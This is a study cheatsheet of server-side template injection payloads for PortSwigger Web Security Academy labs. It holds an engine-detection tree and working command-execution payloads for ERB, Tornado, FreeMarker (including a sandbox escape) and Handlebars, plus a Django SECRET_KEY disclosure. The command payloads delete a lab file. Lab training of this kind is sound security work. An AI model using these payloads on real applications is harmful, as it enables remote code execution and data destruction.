# 🎯 Server-Side Template Injection (SSTI) Cheatsheet

Complete exploitation methodologies, engine detection decision trees, sandbox escapes, and payload templates for SSTI labs in PortSwigger Web Security Academy.

---

## 📌 Engine Detection & Decision Tree

Test initial math payloads to identify evaluation behavior and isolate the underlying template engine:

```text
                  ${7*7}
                 /       \
      49 (Java/PHP)        ${7*'7'}
              /            /      \
       FreeMarker     49 (PHP)  7777777 (Python)
       ${7*7}          Smarty     Twig / Jinja2
```

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Basic Injections & Engine Identification

**Basic server-side template injection**
ERB (Ruby) template engine evaluating untrusted user input directly:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

**Basic server-side template injection (code context)**
Tornado (Python) template injection where input is executed directly inside a code block context:

```python
blog-post-author-display=user.name}{%25+import+os+%25}${os.system('rm+/home/carlos/morale.txt')}
```

**Server-side template injection using documentation**
FreeMarker (Java) template engine executing system commands using built-in execute functionalities:

```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

---

### 2. Unknown Engines & Context Bypasses

**Server-side template injection in an unknown language with a documented exploit**
Handlebars (Node.js) engine exploitation via helper functions and prototype chain overrides:
Don't forget to url encode before you send 

```handlebars
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
*Node.js / Handlebars helper payload:*
```handlebars
{{this.push "return process.mainModule.require('child_process').execSync('rm /home/carlos/morale.txt');"}}
```

**Server-side template injection with information disclosure via user-supplied objects**
Django (Python) environment exposing sensitive settings (`SECRET_KEY`) via global environment context:

```django
{{request.current_app}}
{{settings.SECRET_KEY}}
```

---

### 3. Sandbox Escapes & Custom Exploits

**Server-side template injection in a sandboxed environment**
FreeMarker sandbox escape leveraging class loader reflection to invoke forbidden classes:

```ftl
<#assign classLoader=object?api.class.getClassLoader()>
<#assign execute=classLoader.loadClass("freemarker.template.utility.Execute")?new()>
${execute("rm /home/carlos/morale.txt")}
```

**Server-side template injection with a custom exploit**
Exploiting custom object methods (e.g., `gdprDelete` or clean-up tasks) exposed to the template environment to delete system files or execute commands:

```text
${user.gdprDelete()}
```

---
